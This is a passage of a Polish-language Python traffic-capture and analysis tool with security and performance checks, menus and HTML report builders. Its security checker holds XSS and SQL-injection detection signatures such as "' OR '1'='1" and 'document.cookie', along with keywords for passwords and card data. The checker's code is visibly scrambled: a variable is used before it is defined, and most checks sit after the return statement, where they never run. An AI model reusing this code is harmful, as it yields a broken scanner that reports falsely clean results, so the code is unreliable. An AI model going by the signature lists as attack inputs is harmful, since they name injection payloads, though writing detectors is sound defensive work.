            print(f"Błąd podczas eksportowania danych: {e}")
            import traceback
            traceback.print_exc()
            return False

    def analyze_security_issues(self):
        """Analizuje przechwycony ruch pod kątem problemów bezpieczeństwa

        Returns:
            list: Lista wykrytych problemów bezpieczeństwa
        """
        if not self.captured_data:
            print("Brak danych do analizy. Najpierw przechwytaj ruch lub wczytaj dane z pliku.")
            return []

        try:
            security_issues = []

            print("\n=== Analiza problemów bezpieczeństwa ===")

            # 1. Wykrywanie niezaszyfrowanych HTTP
            http_urls = [url for url in self.captured_data.keys() if url.startswith('http://')]
            if http_urls:
                print(f"\n[!] Wykryto {len(http_urls)} niezaszyfrowanych połączeń HTTP:")
                for i, url in enumerate(http_urls[:5]):  # Pokaż maksymalnie 5 przykładów
                    print(f"  {i + 1}. {url}")

                if len(http_urls) > 5:
                    print(f"  ... oraz {len(http_urls) - 5} więcej.")

                security_issues.append({
                    "type": "unencrypted_traffic",
                    "severity": "HIGH",
                    "description": "Wykryto niezaszyfrowany ruch HTTP",
                    "count": len(http_urls),
                    "urls": http_urls,
                    "recommendation": "Przejdź na HTTPS dla wszystkich połączeń, aby zapewnić szyfrowanie danych."
                })

            # 2. Wykrywanie niezaszyfrowanych danych osobowych
            sensitive_keywords = [
                'password', 'hasło', 'haslo', 'pass', 'pwd', 'passwd',
                'email', 'login', 'username', 'użytkownik', 'uzytkownik',
                'pesel', 'credit', 'card', 'karta', 'cvv', 'cvc'
            ]

            unsecured_sensitive_data = []
            for url, requests in self.captured_data.items():
                if not url.startswith('https://'):
                    for req in requests:
                        if req.get('post_data'):
                            post_data = req.get('post_data', '').lower()
                            for keyword in sensitive_keywords:
                                if keyword in post_data:
                                    unsecured_sensitive_data.append({
                                        "url": url,
                                        "keyword": keyword,
                                        "timestamp": req.get('timestamp', 'unknown')
                                    })
                                    break

            if potential_xss:
                print(f"\n[!] Wykryto {len(potential_xss)} potencjalnych prób ataków XSS:")
                for i, xss in enumerate(potential_xss[:5]):  # Pokaż maksymalnie 5 przykładów
                    print(
                        f"  {i + 1}. {xss['url']} - metoda: {xss['method']}, wykryto: '{xss['signature']}' ({xss['timestamp']})")

                if len(potential_xss) > 5:
                    print(f"  ... oraz {len(potential_xss) - 5} więcej.")

                security_issues.append({
                    "type": "potential_xss",
                    "severity": "HIGH",
                    "description": "Wykryto potencjalne próby ataków XSS",
                    "count": len(potential_xss),
                    "examples": potential_xss,
                    "recommendation": "Zaimplementuj filtrowanie wejścia i wyjścia dla wszystkich danych użytkownika. Używaj nagłówka Content-Security-Policy."
                })

            # 5. Wykrywanie potencjalnych ataków SQL Injection
            sqli_signatures = [
                "' OR ", "' AND ", "-- ", "/*", "*/", "UNION SELECT", "DROP TABLE",
                "1=1", "1 = 1", "' OR '1'='1", "' OR 1=1", "OR 1=1", "' --"
            ]

            potential_sqli = []
            for url, requests in self.captured_data.items():
                for req in requests:
                    # Sprawdź dane GET (w URL)
                    if '?' in url:
                        query_params = url.split('?', 1)[1]
                        for sig in sqli_signatures:
                            if sig.lower() in query_params.lower():
                                potential_sqli.append({
                                    "url": url,
                                    "method": "GET",
                                    "signature": sig,
                                    "timestamp": req.get('timestamp', 'unknown')
                                })
                                break

                    # Sprawdź dane POST
                    if req.get('post_data'):
                        post_data = req.get('post_data', '')
                        for sig in sqli_signatures:
                            if sig.lower() in post_data.lower():
                                potential_sqli.append({
                                    "url": url,
                                    "method": "POST",
                                    "signature": sig,
                                    "timestamp": req.get('timestamp', 'unknown')
                                })
                                break

            if potential_sqli:
                print(f"\n[!] Wykryto {len(potential_sqli)} potencjalnych prób ataków SQL Injection:")
                for i, sqli in enumerate(potential_sqli[:5]):  # Pokaż maksymalnie 5 przykładów
                    print(
                        f"  {i + 1}. {sqli['url']} - metoda: {sqli['method']}, wykryto: '{sqli['signature']}' ({sqli['timestamp']})")

                if len(potential_sqli) > 5:
                    print(f"  ... oraz {len(potential_sqli) - 5} więcej.")

                security_issues.append({
                    "type": "potential_sqli",
                    "severity": "CRITICAL",
                    "description": "Wykryto potencjalne próby ataków SQL Injection",
                    "count": len(potential_sqli),
                    "examples": potential_sqli,
                    "recommendation": "Używaj parametryzowanych zapytań SQL i ORM. Waliduj wszystkie dane wejściowe."
                })

            # 6. Wykrywanie brakujących nagłówków bezpieczeństwa
            security_headers = {
                'Content-Security-Policy': 0,
                'X-Content-Type-Options': 0,
                'X-Frame-Options': 0,
                'X-XSS-Protection': 0,
                'Strict-Transport-Security': 0
            }

            header_checks = 0
            for url, requests in self.captured_data.items():
                for req in requests:
                    headers = req.get('headers', {})
                    header_checks += 1

                    for header in security_headers:
                        if header in headers:
                            security_headers[header] += 1

            missing_headers = []
            if header_checks > 0:
                for header, count in security_headers.items():
                    percentage = (count / header_checks) * 100
                    if percentage < 50:  # Jeśli mniej niż 50% ma ten nagłówek
                        missing_headers.append({
                            "header": header,
                            "present_percentage": percentage
                        })

            if missing_headers:
                print(f"\n[!] Wykryto brakujące nagłówki bezpieczeństwa:")
                for i, header in enumerate(missing_headers):
                    print(f"  {i + 1}. {header['header']} - obecny tylko w {header['present_percentage']:.1f}% żądań")

                security_issues.append({
                    "type": "missing_security_headers",
                    "severity": "MEDIUM",
                    "description": "Wykryto brakujące nagłówki bezpieczeństwa",
                    "count": len(missing_headers),
                    "headers": missing_headers,
                    "recommendation": "Dodaj standardowe nagłówki bezpieczeństwa do odpowiedzi HTTP."
                })

            # 7. Podsumowanie
            if security_issues:
                print(f"\n=== Podsumowanie problemów bezpieczeństwa ===")
                print(f"Wykryto łącznie {len(security_issues)} kategorii problemów:")

                severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
                for issue in security_issues:
                    severity_counts[issue["severity"]] += 1

                for severity, count in severity_counts.items():
                    if count > 0:
                        print(f"- {severity}: {count}")
            else:
                print("\nNie wykryto żadnych problemów bezpieczeństwa w analizowanych danych.")

            return security_issues

        except Exception as e:
            print(f"Błąd podczas analizy problemów bezpieczeństwa: {e}")
            import traceback
            traceback.print_exc()
            return []

            if unsecured_sensitive_data:
                print(
                    f"\n[!] Wykryto {len(unsecured_sensitive_data)} przypadków przesyłania danych wrażliwych przez niezaszyfrowane połączenia:")
                for i, data in enumerate(unsecured_sensitive_data[:5]):  # Pokaż maksymalnie 5 przykładów
                    print(
                        f"  {i + 1}. {data['url']} - wykryto słowo kluczowe: '{data['keyword']}' ({data['timestamp']})")

                if len(unsecured_sensitive_data) > 5:
                    print(f"  ... oraz {len(unsecured_sensitive_data) - 5} więcej.")

                security_issues.append({
                    "type": "unsecured_sensitive_data",
                    "severity": "CRITICAL",
                    "description": "Wykryto przesyłanie danych wrażliwych przez niezaszyfrowane połączenia",
                    "count": len(unsecured_sensitive_data),
                    "examples": unsecured_sensitive_data,
                    "recommendation": "Natychmiast przejdź na HTTPS dla wszystkich formularzy zawierających dane wrażliwe."
                })

            # 3. Wykrywanie podejrzanych ciasteczek bez flagi Secure
            unsecured_cookies = []
            for url, requests in self.captured_data.items():
                for req in requests:
                    cookies = req.get('cookies', {})
                    for cookie_name, cookie_value in cookies.items():
                        # Sprawdź czy ciasteczko zawiera potencjalnie wrażliwe informacje
                        if any(keyword in cookie_name.lower() for keyword in ['sess', 'auth', 'token', 'login', 'id']):
                            if not url.startswith('https://'):
                                unsecured_cookies.append({
                                    "url": url,
                                    "cookie_name": cookie_name,
                                    "timestamp": req.get('timestamp', 'unknown')
                                })

            if unsecured_cookies:
                print(
                    f"\n[!] Wykryto {len(unsecured_cookies)} niezabezpieczonych ciasteczek sesyjnych/autoryzacyjnych:")
                for i, cookie in enumerate(unsecured_cookies[:5]):  # Pokaż maksymalnie 5 przykładów
                    print(f"  {i + 1}. {cookie['url']} - ciasteczko: '{cookie['cookie_name']}' ({cookie['timestamp']})")

                if len(unsecured_cookies) > 5:
                    print(f"  ... oraz {len(unsecured_cookies) - 5} więcej.")

                security_issues.append({
                    "type": "unsecured_cookies",
                    "severity": "HIGH",
                    "description": "Wykryto niezabezpieczone ciasteczka sesyjne/autoryzacyjne",
                    "count": len(unsecured_cookies),
                    "examples": unsecured_cookies,
                    "recommendation": "Dodaj flagi Secure i HttpOnly do wszystkich ciasteczek sesyjnych i autoryzacyjnych."
                })

            # 4. Wykrywanie potencjalnych ataków XSS
            xss_signatures = [
                '<script>', 'javascript:', 'onerror=', 'onload=', 'eval(', 'document.cookie',
                'alert(', 'prompt(', 'confirm(', 'document.location'
            ]

            potential_xss = []
            for url, requests in self.captured_data.items():
                for req in requests:
                    # Sprawdź dane GET (w URL)
                    if '?' in url:
                        query_params = url.split('?', 1)[1]
                        for sig in xss_signatures:
                            if sig.lower() in query_params.lower():
                                potential_xss.append({
                                    "url": url,
                                    "method": "GET",
                                    "signature": sig,
                                    "timestamp": req.get('timestamp', 'unknown')
                                })
                                break

                    # Sprawdź dane POST
                    if req.get('post_data'):
                        post_data = req.get('post_data', '')
                        for sig in xss_signatures:
                            if sig.lower() in post_data.lower():
                                potential_xss.append({
                                    "url": url,
                                    "method": "POST",
                                    "signature": sig,
                                    "timestamp": req.get('timestamp', 'unknown')
                                })
                                break

    def analyze_performance_issues(self):
        """Analizuje przechwycony ruch pod kątem problemów wydajności

        Returns:
            list: Lista wykrytych problemów wydajności
        """
        if not self.captured_data:
            print("Brak danych do analizy. Najpierw przechwytaj ruch lub wczytaj dane z pliku.")
            return []

        try:
            performance_issues = []

            print("\n=== Analiza problemów wydajności ===")

            # 1. Wykrywanie stron z dużą liczbą żądań
            high_request_urls = []
            for url, requests in self.captured_data.items():
                if len(requests) > 20:  # Próg dla zbyt wielu żądań
                    domain = url.split('://', 1)[1].split('/', 1)[0] if '://' in url else url
                    high_request_urls.append({
                        "url": url,
                        "domain": domain,
                        "request_count": len(requests)
                    })

            if high_request_urls:
                # Posortuj według liczby żądań (malejąco)
                high_request_urls.sort(key=lambda x: x["request_count"], reverse=True)

                print(f"\n[!] Wykryto {len(high_request_urls)} stron z dużą liczbą żądań:")
                for i, url_data in enumerate(high_request_urls[:5]):  # Pokaż maksymalnie 5 przykładów
                    print(f"  {i + 1}. {url_data['url']} - liczba żądań: {url_data['request_count']}")

                if len(high_request_urls) > 5:
                    print(f"  ... oraz {len(high_request_urls) - 5} więcej.")

                performance_issues.append({
                    "type": "high_request_count",
                    "severity": "MEDIUM",
                    "description": "Wykryto strony z dużą liczbą żądań",
                    "count": len(high_request_urls),
                    "examples": high_request_urls,
                    "recommendation": "Rozważ łączenie zasobów (CSS, JavaScript) oraz użycie technik lazy loading dla obrazów."
                })

            # 2. Wykrywanie zbyt dużych odpowiedzi
            large_responses = []
            for url, requests in self.captured_data.items():
                for req in requests:
                    if 'response_size' in req and req['response_size'] > 1000000:  # Większe niż 1MB
                        large_responses.append({
                            "url": url,
                            "method": req.get('method', 'GET'),
                            "size": req['response_size'],
                            "timestamp": req.get('timestamp', 'unknown')
                        })

            if large_responses:
                # Posortuj według rozmiaru (malejąco)
                large_responses.sort(key=lambda x: x["size"], reverse=True)

                print(f"\n[!] Wykryto {len(large_responses)} odpowiedzi o dużym rozmiarze (>1MB):")
                for i, resp in enumerate(large_responses[:5]):  # Pokaż maksymalnie 5 przykładów
                    size_mb = resp['size'] / 1000000
                    print(f"  {i + 1}. {resp['url']} - rozmiar: {size_mb:.2f} MB ({resp['timestamp']})")

                if len(large_responses) > 5:
                    print(f"  ... oraz {len(large_responses) - 5} więcej.")

                performance_issues.append({
                    "type": "large_responses",
                    "severity": "MEDIUM",
                    "description": "Wykryto odpowiedzi o dużym rozmiarze",
                    "count": len(large_responses),
                    "examples": large_responses,
                    "recommendation": "Wprowadź kompresję, optymalizację obrazów i paginację dla dużych zestawów danych."
                })

            # 3. Wykrywanie powtarzających się żądań do tych samych zasobów
            repeated_requests = {}
            for url, requests in self.captured_data.items():
                # Grupuj żądania według metody i ścieżki
                request_groups = {}
                for req in requests:
                    method = req.get('method', 'GET')
                    timestamp = req.get('timestamp', '')

                    # Ignoruj żądania bez timestamp (nie możemy określić czy były blisko siebie)
                    if not timestamp:
                        continue

                    key = f"{method} {url}"
                    if key not in request_groups:
                        request_groups[key] = []
                    request_groups[key].append(timestamp)

                # Sprawdź grupy z wieloma żądaniami
                for key, timestamps in request_groups.items():
                    if len(timestamps) > 3:  # Próg dla powtarzających się żądań
                        repeated_requests[key] = len(timestamps)

            if repeated_requests:
                # Posortuj według liczby powtórzeń (malejąco)
                top_repeated = sorted(repeated_requests.items(), key=lambda x: x[1], reverse=True)

                print(f"\n[!] Wykryto {len(repeated_requests)} powtarzających się żądań do tych samych zasobów:")
                for i, (req, count) in enumerate(top_repeated[:5]):  # Pokaż maksymalnie 5 przykładów
                    print(f"  {i + 1}. {req} - liczba powtórzeń: {count}")

                if len(repeated_requests) > 5:
                    print(f"  ... oraz {len(repeated_requests) - 5} więcej.")

                performance_issues.append({
                    "type": "repeated_requests",
                    "severity": "HIGH",
                    "description": "Wykryto powtarzające się żądania do tych samych zasobów",
                    "count": len(repeated_requests),
                    "examples": [{"request": req, "count": count} for req, count in top_repeated[:10]],
                    "recommendation": "Zaimplementuj buforowanie po stronie klienta oraz unikaj niepotrzebnego odświeżania strony."
                })

            # 4. Wykrywanie nieefektywnych wzorców API
            api_patterns = {}
            for url, requests in self.captured_data.items():
                # Sprawdź czy to jest URL API
                if '/api/' in url or '/rest/' in url or '/v1/' in url or '/v2/' in url:
                    for req in requests:
                        method = req.get('method', 'GET')
                        key = f"{method} {url}"
                        if key not in api_patterns:
                            api_patterns[key] = 0
                        api_patterns[key] += 1

            inefficient_api = []
            for pattern, count in api_patterns.items():
                # Szukaj wzorców wskazujących na nieefektywne API
                if count > 10:  # Zbyt wiele żądań do tego samego endpointu
                    inefficient_api.append({
                        "pattern": pattern,
                        "count": count,
                        "issue": "high_frequency"
                    })
                elif 'GET' in pattern and count > 5:
                    # Sprawdź czy to może być N+1 zapytanie (wiele GETów do podobnych endpointów)
                    base_url = pattern.split('?')[0] if '?' in pattern else pattern
                    similar_patterns = [p for p in api_patterns if p.startswith(
                        base_url.split(' ')[0] + ' ' + base_url.split(' ')[1].rsplit('/', 1)[0])]
                    if len(similar_patterns) > 3:
                        inefficient_api.append({
                            "pattern": pattern,
                            "count": count,
                            "similar_patterns_count": len(similar_patterns),
                            "issue": "n_plus_1"
                        })

            if inefficient_api:
                print(f"\n[!] Wykryto {len(inefficient_api)} potencjalnie nieefektywnych wzorców API:")
                for i, api in enumerate(inefficient_api[:5]):  # Pokaż maksymalnie 5 przykładów
                    issue_type = "zbyt częste wywołania" if api[
                                                                'issue'] == "high_frequency" else "prawdopodobny problem N+1"
                    print(f"  {i + 1}. {api['pattern']} - {issue_type} (liczba żądań: {api['count']})")

                if len(inefficient_api) > 5:
                    print(f"  ... oraz {len(inefficient_api) - 5} więcej.")

                performance_issues.append({
                    "type": "inefficient_api_patterns",
                    "severity": "HIGH",
                    "description": "Wykryto nieefektywne wzorce API",
                    "count": len(inefficient_api),
                    "examples": inefficient_api,
                    "recommendation": "Zoptymalizuj API, użyj GraphQL lub zaimplementuj batch API dla redukcji liczby żądań."
                })

            # 5. Wykrywanie zasobów bez cache'owania
            nocache_resources = []
            cache_headers = ['cache-control', 'expires', 'etag', 'last-modified']

            for url, requests in self.captured_data.items():
                # Sprawdź statyczne zasoby, które powinny być cache'owane
                if any(ext in url.lower() for ext in
                       ['.js', '.css', '.jpg', '.jpeg', '.png', '.gif', '.svg', '.woff', '.woff2']):
                    for req in requests:
                        headers = {k.lower(): v for k, v in req.get('headers', {}).items()}

                        # Sprawdź brak nagłówków cache lub nagłówek no-cache
                        has_cache_headers = any(h in headers for h in cache_headers)
                        has_nocache = 'cache-control' in headers and (
                                    'no-cache' in headers['cache-control'].lower() or 'no-store' in headers[
                                'cache-control'].lower())

                        if not has_cache_headers or has_nocache:
                            nocache_resources.append({
                                "url": url,
                                "cache_headers_present": has_cache_headers,
                                "has_nocache_directive": has_nocache
                            })
                            break  # Jeden przykład na URL wystarczy

            if nocache_resources:
                print(f"\n[!] Wykryto {len(nocache_resources)} zasobów statycznych bez odpowiedniego cache'owania:")
                for i, resource in enumerate(nocache_resources[:5]):  # Pokaż maksymalnie 5 przykładów
                    issue = "brak nagłówków cache" if not resource['cache_headers_present'] else "dyrektywa no-cache"
                    print(f"  {i + 1}. {resource['url']} - {issue}")

                if len(nocache_resources) > 5:
                    print(f"  ... oraz {len(nocache_resources) - 5} więcej.")

                performance_issues.append({
                    "type": "missing_cache",
                    "severity": "MEDIUM",
                    "description": "Wykryto zasoby statyczne bez odpowiedniego cache'owania",
                    "count": len(nocache_resources),
                    "examples": nocache_resources,
                    "recommendation": "Dodaj odpowiednie nagłówki cache dla statycznych zasobów, użyj długich TTL dla niezmiennych zasobów."
                })

            # 6. Podsumowanie
            if performance_issues:
                print(f"\n=== Podsumowanie problemów wydajności ===")
                print(f"Wykryto łącznie {len(performance_issues)} kategorii problemów:")

                severity_counts = {"HIGH": 0, "MEDIUM": 0, "LOW": 0}
                for issue in performance_issues:
                    severity_counts[issue["severity"]] += 1

                for severity, count in severity_counts.items():
                    if count > 0:
                        print(f"- {severity}: {count}")
            else:
                print("\nNie wykryto żadnych problemów wydajności w analizowanych danych.")

            return performance_issues

        except Exception as e:
            print(f"Błąd podczas analizy problemów wydajności: {e}")
            import traceback
            traceback.print_exc()
            return []

    def show_browser_menu(self):
        """Wyświetla menu przeglądarki sesji"""
        while True:
            print("\nPrzeglądarka sesji:")
            print("1. Uruchom standardową przeglądarkę sesji")
            print("2. Uruchom interaktywną przeglądarkę sesji")
            print("3. Uruchom interaktywne przeglądanie zapisanych stron")  # Nowa opcja
            print("4. Odtwórz konkretne żądanie")
            print("5. Symuluj całą sesję przeglądania")
            print("0. Powrót do menu głównego")

            try:
                choice = input("\nWybierz opcję: ").strip()
            except (UnicodeDecodeError, KeyboardInterrupt):
                print("\nNieprawidłowe wejście. Spróbuj ponownie.")
                continue

            if choice == "1":
                if self.captured_data:
                    self.start_session_browser()
                else:
                    print("Brak danych do wyświetlenia. Najpierw przechwytaj ruch lub wczytaj dane z pliku.")
            elif choice == "2":
                if self.captured_data:
                    self.start_interactive_session_browser()
                else:
                    print("Brak danych do wyświetlenia. Najpierw przechwytaj ruch lub wczytaj dane z pliku.")
            elif choice == "3":
                if self.captured_data:
                    self.interactive_session_browsing()  # Wywołanie nowej funkcji
                else:
                    print("Brak danych do wyświetlenia. Najpierw przechwytaj ruch lub wczytaj dane z pliku.")
            elif choice == "4":
                if self.captured_data:
                    self.replay_specific_request()
                else:
                    print("Brak danych do wyświetlenia. Najpierw przechwytaj ruch lub wczytaj dane z pliku.")
            elif choice == "5":
                if self.captured_data:
                    self.simulate_browsing_session()
                else:
                    print("Brak danych do wyświetlenia. Najpierw przechwytaj ruch lub wczytaj dane z pliku.")
            elif choice == "0":
                break
            else:
                print("Nieprawidłowy wybór. Wybierz opcję od 0 do 5.")

    def show_data_management_menu(self):
        """Wyświetla menu zarządzania danymi"""
        while True:
            print("\nZarządzanie danymi:")
            print("1. Zapisz przechwycone dane")
            print("2. Wczytaj dane z pliku")
            print("3. Połącz dane z wielu plików")
            print("4. Wyczyść bieżące dane")
            print("5. Eksportuj dane jako HTML")
            print("0. Powrót do menu głównego")

            try:
                choice = input("\nWybierz opcję: ").strip()
            except (UnicodeDecodeError, KeyboardInterrupt):
                print("\nNieprawidłowe wejście. Spróbuj ponownie.")
                continue

            if choice == "1":
                self.save_captured_data()
            elif choice == "2":
                try:
                    filename = input("Podaj nazwę pliku: ").strip()
                    if filename:
                        self.load_captured_data(filename)
                    else:
                        print("Nie podano nazwy pliku.")
                except (UnicodeDecodeError, KeyboardInterrupt):
                    print("\nNieprawidłowe wejście. Operacja anulowana.")
            elif choice == "3":
                try:
                    filenames_input = input("Podaj nazwy plików (oddzielone przecinkiem): ").strip()
                    if filenames_input:
                        filenames = [f.strip() for f in filenames_input.split(',')]
                        self.merge_sessions(filenames)
                    else:
                        print("Nie podano nazw plików.")
                except (UnicodeDecodeError, KeyboardInterrupt):
                    print("\nNieprawidłowe wejście. Operacja anulowana.")
            elif choice == "4":
                try:
                    confirm = input("Czy na pewno chcesz wyczyścić wszystkie dane? (t/n): ").strip().lower()
                    if confirm == 't' or confirm == 'tak':
                        self.captured_data = {}
                        print("Dane zostały wyczyszczone.")
                    else:
                        print("Operacja anulowana.")
                except (UnicodeDecodeError, KeyboardInterrupt):
                    print("\nNieprawidłowe wejście. Operacja anulowana.")
            elif choice == "5":
                try:
                    filename = input("Podaj nazwę pliku HTML: ").strip()
                    if filename:
                        self.export_as_html(filename)
                    else:
                        print("Nie podano nazwy pliku.")
                except (UnicodeDecodeError, KeyboardInterrupt):
                    print("\nNieprawidłowe wejście. Operacja anulowana.")
            elif choice == "0":
                break
            else:
                print("Nieprawidłowy wybór. Wybierz opcję od 0 do 5.")

    def show_analysis_menu(self):
        """Wyświetla menu analizy ruchu"""
        while True:
            print("\nAnaliza ruchu:")
            print("1. Przeprowadź pełną analizę ruchu")
            print("2. Znajdź problemy bezpieczeństwa")
            print("3. Znajdź problemy wydajności")
            print("4. Analizuj wzorce ruchu")
            print("5. Generuj raport analizy")
            print("0. Powrót do menu głównego")

            try:
                choice = input("\nWybierz opcję: ").strip()
            except (UnicodeDecodeError, KeyboardInterrupt):
                print("\nNieprawidłowe wejście. Spróbuj ponownie.")
                continue

            if choice == "1":
                if self.captured_data:
                    self.analyze_traffic()
                else:
                    print("Brak danych do analizy.")
            elif choice == "2":
                if self.captured_data:
                    self.analyze_security_issues()
                else:
                    print("Brak danych do analizy.")
            elif choice == "3":
                if self.captured_data:
                    self.analyze_performance_issues()
                else:
                    print("Brak danych do analizy.")
            elif choice == "4":
                if self.captured_data:
                    self.analyze_traffic_patterns()
                else:
                    print("Brak danych do analizy.")
            elif choice == "5":
                if self.captured_data:
                    filename = input("Podaj nazwę pliku raportu: ").strip()
                    if filename:
                        self.generate_analysis_report(filename)
                    else:
                        print("Nie podano nazwy pliku.")
                else:
                    print("Brak danych do analizy.")
            elif choice == "0":
                break
            else:
                print("Nieprawidłowy wybór. Wybierz opcję od 0 do 5.")

    def _generate_security_issues_html(self, security_issues):
        """Generuje HTML dla sekcji problemów bezpieczeństwa

        Args:
            security_issues: Lista wykrytych problemów bezpieczeństwa

        Returns:
            str: Kod HTML dla sekcji problemów bezpieczeństwa
        """
        if not security_issues:
            return '<p>Nie wykryto problemów bezpieczeństwa w analizowanych danych.</p>'

        html = '<table>\n'
        html += '    <thead>\n'
        html += '        <tr>\n'
        html += '            <th>Problem</th>\n'
        html += '            <th>Liczba wystąpień</th>\n'
        html += '            <th>Ważność</th>\n'
        html += '        </tr>\n'
        html += '    </thead>\n'
        html += '    <tbody>\n'

        # Posortuj problemy według ważności
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        sorted_issues = sorted(security_issues, key=lambda x: severity_order.get(x.get("severity", "LOW"), 4))

        for i, issue in enumerate(sorted_issues):
            severity = issue.get("severity", "MEDIUM")
            severity_class = f"severity-{severity.lower()}"

            html += f'        <tr>\n'
            html += f'            <td>{issue.get("description", "Nieznany problem")}</td>\n'
            html += f'            <td>{issue.get("count", 0)}</td>\n'
            html += f'            <td><span class="severity {severity_class}">{severity}</span></td>\n'
            html += f'        </tr>\n'
            html += f'        <tr>\n'
            html += f'            <td colspan="3">\n'
            html += f'                <div class="issue-details">\n'

            # Dodaj przykłady
            if "examples" in issue and issue["examples"]:
                html += f'                    <h4>Przykłady</h4>\n'
                html += f'                    <ul>\n'

                for j, example in enumerate(issue["examples"][:5]):  # Pokaż maksymalnie 5 przykładów
                    if isinstance(example, dict):
                        if "url" in example:
                            html += f'                        <li>{example["url"]}'
                            if "timestamp" in example:
                                html += f' ({example["timestamp"]})'
                            if "keyword" in example:
                                html += f' - wykryto słowo kluczowe: \'{example["keyword"]}\''
                            if "cookie_name" in example:
                                html += f' - ciasteczko: \'{example["cookie_name"]}\''
                            if "signature" in example:
                                html += f' - sygnatura: \'{example["signature"]}\''
                            html += '</li>\n'
                        elif "header" in example:
                            html += f'                        <li>Nagłówek {example["header"]} - obecny tylko w {example.get("present_percentage", 0):.1f}% żądań</li>\n'
                        elif "request" in example:
                            html += f'                        <li>{example["request"]} - liczba wystąpień: {example.get("count", 0)}</li>\n'
                    else:
                        html += f'                        <li>{example}</li>\n'

                if len(issue["examples"]) > 5:
                    html += f'                        <li>... oraz {len(issue["examples"]) - 5} więcej.</li>\n'

                html += f'                    </ul>\n'

            # Dodaj zalecenie
            if "recommendation" in issue:
                html += f'                    <div class="recommendation">\n'
                html += f'                        <strong>Zalecenie:</strong> {issue["recommendation"]}\n'
                html += f'                    </div>\n'

            html += f'                </div>\n'
            html += f'            </td>\n'
            html += f'        </tr>\n'

        html += '    </tbody>\n'
        html += '</table>\n'

        return html

    def _generate_performance_issues_html(self, performance_issues):
        """Generuje HTML dla sekcji problemów wydajności

        Args:
            performance_issues: Lista wykrytych problemów wydajności

        Returns:
            str: Kod HTML dla sekcji problemów wydajności
        """
        if not performance_issues:
            return '<p>Nie wykryto problemów wydajności w analizowanych danych.</p>'

        html = '<table>\n'
        html += '    <thead>\n'
        html += '        <tr>\n'
        html += '            <th>Problem</th>\n'
        html += '            <th>Liczba wystąpień</th>\n'
        html += '            <th>Ważność</th>\n'
        html += '        </tr>\n'
        html += '    </thead>\n'
        html += '    <tbody>\n'

        # Posortuj problemy według ważności
        severity_order = {"HIGH": 0, "MEDIUM": 1, "LOW": 2}
        sorted_issues = sorted(performance_issues, key=lambda x: severity_order.get(x.get("severity", "LOW"), 3))

        for i, issue in enumerate(sorted_issues):
            severity = issue.get("severity", "MEDIUM")
            severity_class = f"severity-{severity.lower()}"

            html += f'        <tr>\n'
            html += f'            <td>{issue.get("description", "Nieznany problem")}</td>\n'
            html += f'            <td>{issue.get("count", 0)}</td>\n'
            html += f'            <td><span class="severity {severity_class}">{severity}</span></td>\n'
            html += f'        </tr>\n'
            html += f'        <tr>\n'
            html += f'            <td colspan="3">\n'
            html += f'                <div class="issue-details">\n'

            # Dodaj przykłady
            if "examples" in issue and issue["examples"]:
                html += f'                    <h4>Przykłady</h4>\n'
                html += f'                    <ul>\n'

                for j, example in enumerate(issue["examples"][:5]):  # Pokaż maksymalnie 5 przykładów
                    if isinstance(example, dict):
                        if "url" in example:
                            html += f'                        <li>{example["url"]}'
                            if "request_count" in example:
                                html += f' - liczba żądań: {example["request_count"]}'
                            if "size" in example:
                                size_mb = example["size"] / 1000000
                                html += f' - rozmiar: {size_mb:.2f} MB'
                            html += '</li>\n'
                        elif "pattern" in example:
                            html += f'                        <li>{example["pattern"]} - '
                            if example.get("issue") == "high_frequency":
                                html += f'zbyt częste wywołania (liczba żądań: {example.get("count", 0)})'
                            elif example.get("issue") == "n_plus_1":
                                html += f'prawdopodobny problem N+1 (podobnych wzorców: {example.get("similar_patterns_count", 0)})'
                            html += '</li>\n'
                        elif "request" in example:
                            html += f'                        <li>{example["request"]} - liczba powtórzeń: {example.get("count", 0)}</li>\n'
                    else:
                        html += f'                        <li>{example}</li>\n'

                if len(issue["examples"]) > 5:
                    html += f'                        <li>... oraz {len(issue["examples"]) - 5} więcej.</li>\n'

                html += f'                    </ul>\n'

            # Dodaj zalecenie
            if "recommendation" in issue:
                html += f'                    <div class="recommendation">\n'
                html += f'                        <strong>Zalecenie:</strong> {issue["recommendation"]}\n'
                html += f'                    </div>\n'

            html += f'                </div>\n'
            html += f'            </td>\n'
            html += f'        </tr>\n'

        html += '    </tbody>\n'
        html += '</table>\n'

        return html

    def analyze_traffic_patterns(self):
        """Analizuje wzorce ruchu sieciowego, szukając powtarzających się schematów

        Returns:
            list: Wykryte wzorce ruchu
        """
        if not self.captured_data:
            print("Brak danych do analizy. Najpierw przechwytaj ruch lub wczytaj dane z pliku.")
            return []

        try:
            patterns = []

            print("\n=== Analiza wzorców ruchu sieciowego ===")

            # 1. Wykrywanie sekwencji żądań
            print("\nSzukanie sekwencji żądań...")

            # Utwórz chronologicznie posortowaną listę żądań
            all_requests = []
            for url, requests in self.captured_data.items():
                for req in requests:
                    timestamp = req.get('timestamp', '')
                    if timestamp:  # Tylko jeśli mamy timestamp
                        all_requests.append({
                            'url': url,
                            'timestamp': timestamp,
                            'method': req.get('method', 'GET'),
                            'req_data': req
                        })

            # Sortowanie chronologiczne
            if all_requests:
                try:
                    # Próba konwersji timestamp do formatu datetime jeśli to string
                    from datetime import datetime

                    def parse_timestamp(ts):
                        if isinstance(ts, datetime):
                            return ts
                        try:
                            return datetime.strptime(ts, "%Y-%m-%d %H:%M:%S")
                        except:
                            try:
                                return datetime.strptime(ts, "%Y-%m-%d %H:%M:%S.%f")
                            except:
                                return datetime.min

                    all_requests.sort(key=lambda x: parse_timestamp(x['timestamp']))
                except:
                    # Fallback na string sorting jeśli konwersja się nie powiedzie
                    all_requests.sort(key=lambda x: str(x['timestamp']))

            # Zidentyfikuj powtarzające się sekwencje
            sequence_length = 3  # Minimalna długość sekwencji do wykrycia
            max_sequences = 10  # Maksymalna liczba sekwencji do zwrócenia

            found_sequences = []

            # Funkcja do generowania "odcisku palca" żądania (bez timestamp)
            def request_fingerprint(req):
                return f"{req['method']}|{req['url']}"

            # Sprawdź sekwencje o różnej długości
            for seq_len in range(sequence_length,
                                 min(10, len(all_requests) // 2)):  # Max 10 lub połowa wszystkich żądań
                for i in range(len(all_requests) - seq_len * 2 + 1):
                    # Utwórz odcisk palca sekwencji
                    seq_fingerprint = [request_fingerprint(all_requests[i + j]) for j in range(seq_len)]

                    # Szukaj tej samej sekwencji później
                    for j in range(i + seq_len, len(all_requests) - seq_len + 1):
